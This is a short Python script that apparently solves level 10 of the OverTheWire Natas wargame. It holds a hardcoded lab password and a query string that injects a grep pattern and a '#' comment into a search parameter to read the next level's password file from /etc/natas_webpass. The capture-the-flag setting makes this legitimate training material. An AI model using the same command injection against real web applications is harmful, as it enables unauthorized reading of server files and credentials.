# webscraper for natas10
import requests
from bs4 import BeautifulSoup
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    #print(content)
    queryString = '/?needle=%5Ba-zA-Z0-9%5D+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search' #query string, with code injection, no illegal characters (hijack the command, and comment out)
    resp2 = session.get(url + queryString, auth=(username, password))
    passwordText = resp2.text
    soup = BeautifulSoup(passwordText, 'html.parser')
    passString = str(soup.body)
    regex = re.findall("\w{32}", passString)
    print(regex)



viewSource = initialRequest()

